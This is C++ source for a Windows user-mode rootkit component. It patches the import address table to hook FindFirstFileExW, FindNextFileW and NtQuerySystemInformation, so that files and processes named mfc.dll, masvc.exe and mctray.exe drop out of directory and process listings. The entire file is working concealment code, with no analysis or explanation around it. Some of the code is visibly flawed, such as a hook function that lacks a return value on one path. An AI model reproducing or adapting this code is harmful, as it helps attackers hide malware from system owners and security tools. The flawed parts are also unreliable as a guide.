#include "pch.h"


HMODULE hNTDLL = GetModuleHandleA("ntdll");
typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
IN     SYSTEM_INFORMATION_CLASS SystemInformationClass,
OUT   PVOID                    SystemInformation,
IN      ULONG                    SystemInformationLength,
OUT PULONG                   ReturnLength OPTIONAL);

_NtQuerySystemInformation originalNtQuerySystemInformation = (_NtQuerySystemInformation) GetProcAddress(hNTDLL, "NtQuerySystemInformation");

//define FindNextFileW 
using PrototypeFindNextFileW = BOOL(WINAPI*)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
PrototypeFindNextFileW originalFindNextFileW = FindNextFileW;

//define FindFirstFileExW
using PrototypeFindFirstFileExW = HANDLE(WINAPI*)(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
PrototypeFindFirstFileExW originalFindFirstFileExW = FindFirstFileExW;


NTSTATUS WINAPI HookedNtQuerySystemInformation(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength) {

	NTSTATUS ret = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (NT_SUCCESS(ret) && SystemInformationClass == SystemProcessInformation) {
		PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION current = NULL;
		PSYSTEM_PROCESS_INFORMATION next = pInfo;
		
		do {
			current = next;
			next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);
			if ((!wcsncmp(next->ImageName.Buffer, L"mfc.dll", next->ImageName.Length)) || (!wcsncmp(next->ImageName.Buffer, L"masvc.exe", next->ImageName.Length) || (!wcsncmp(next->ImageName.Buffer, L"mctray.exe", next->ImageName.Length)))) {
				if (next->NextEntryOffset) {
					current->NextEntryOffset += next->NextEntryOffset;
				}
				else {
					current->NextEntryOffset = 0;
				}
			}
		} while (current->NextEntryOffset != 0);

		
		return ret;
	}

}


int WINAPI newFindNextFileW(__in HANDLE hFindFile, __out LPWIN32_FIND_DATAW lpFindFileData) {

	//Call the original function to get file name until a file is found that does not need to be hidden.
	BOOL ret;
	do {
		ret = originalFindNextFileW(hFindFile, lpFindFileData);
	} while ((ret != 0) && ((wcsstr(lpFindFileData->cFileName, L"mfc.dll") == lpFindFileData->cFileName) || (wcsstr(lpFindFileData->cFileName, L"masvc.exe") == lpFindFileData->cFileName) || (wcsstr(lpFindFileData->cFileName, L"mctray.exe") == lpFindFileData->cFileName)));

	return ret;

	return 0;

}



HANDLE WINAPI newFindFirstFileExW(__in LPCWSTR lpFileName, __in FINDEX_INFO_LEVELS fInfoLevelId, __out LPVOID lpFindFileData, __in FINDEX_SEARCH_OPS fSearchOp, __reserved  LPVOID lpSearchFilter, __in DWORD dwAdditionalFlags)
{

	HANDLE handle = originalFindFirstFileExW(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	if (handle == INVALID_HANDLE_VALUE)
		return handle;

	LPWIN32_FIND_DATAW findFileData = (LPWIN32_FIND_DATAW)lpFindFileData;
	if ((wcsstr(findFileData->cFileName, L"mfc") == findFileData->cFileName) || (wcsstr(findFileData->cFileName, L"mctray") == findFileData->cFileName) || (wcsstr(findFileData->cFileName, L"masvc") == findFileData->cFileName)) // We have to hide it!
	{
		BOOL ret = FindNextFileW(handle, findFileData);
		if (ret == 0)
			return INVALID_HANDLE_VALUE;
		else
			return handle;
	}

	return handle;
}



bool rewriteThunk(PIMAGE_THUNK_DATA64 pThunk, DWORD64 newFunc, DWORD oldFunc) {
	DWORD oldProtect = 0;
	DWORD junk = 0;
	if (VirtualProtect(&pThunk->u1.Function, sizeof(DWORD64), PAGE_READWRITE, &oldProtect) == 0) {
		return false;
	}

	oldFunc = pThunk->u1.Function;
	pThunk->u1.Function = newFunc;

	if (VirtualProtect(&pThunk->u1.Function, sizeof(DWORD64), oldProtect, &junk) == 0) {
		return false;
	}
	return true;
}



bool IAThooking(DWORD64 hProcess, LPCSTR targetFunction, DWORD64 newFunc, DWORD orgFunc) {

	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)hProcess;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)hProcess + dosHeaders->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	IMAGE_OPTIONAL_HEADER64 optionalHeader;
	optionalHeader = ntHeaders->OptionalHeader;
	if (optionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		return FALSE;
	}

	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)importsDirectory.VirtualAddress + hProcess);
	PIMAGE_THUNK_DATA64 pFirstThunk = NULL, pOriginalFirstThunk = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	// loop over DLLs
	while (importDescriptor->Characteristics != 0) {
		pFirstThunk = (PIMAGE_THUNK_DATA64)(hProcess + importDescriptor->FirstThunk);//pointing to its IAT
		pOriginalFirstThunk = (PIMAGE_THUNK_DATA64)(hProcess + importDescriptor->OriginalFirstThunk);//INT
		functionName = (PIMAGE_IMPORT_BY_NAME)(hProcess + pOriginalFirstThunk->u1.AddressOfData);


		// Search for our target function
		while (pOriginalFirstThunk->u1.AddressOfData != 0) {
			//didn't understand
			if (!(pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) && strcmp(targetFunction, (char*)functionName->Name) == 0) {
				if (rewriteThunk(pFirstThunk, newFunc, orgFunc)) {
					return true;

				}
			}
			pOriginalFirstThunk++;
			functionName = (PIMAGE_IMPORT_BY_NAME)(hProcess + pOriginalFirstThunk->u1.AddressOfData);
			pFirstThunk++;
		}
		//Next DLL
		importDescriptor++;

	}

	return false;
}

int main() {
	IAThooking((DWORD64)GetModuleHandleA(NULL), "FindNextFileW", (DWORD64)&newFindNextFileW, (DWORD64)&originalFindNextFileW);
	IAThooking((DWORD64)GetModuleHandleA(NULL), "FindFirstFileExW", (DWORD64)&newFindFirstFileExW, (DWORD64)&originalFindFirstFileExW);
	IAThooking((DWORD64)GetModuleHandleA(NULL), "NtQuerySystemInformation", (DWORD64)&HookedNtQuerySystemInformation, (DWORD64)&originalNtQuerySystemInformation);
	
	return 0;
}

